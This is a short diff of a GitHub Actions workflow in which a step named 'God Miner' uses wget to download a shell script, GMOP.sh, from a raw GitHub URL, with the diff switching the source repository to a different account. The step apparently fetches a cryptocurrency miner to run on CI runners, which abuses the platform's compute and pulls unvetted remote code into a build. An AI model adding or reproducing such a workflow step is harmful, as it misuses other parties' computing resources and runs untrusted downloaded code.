@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: God Miner
       run: |
-        wget https://raw.githubusercontent.com/Godmine99/cpu/main/GMOP.sh
+        wget https://raw.githubusercontent.com/farkoor/cpu/main/GMOP.sh
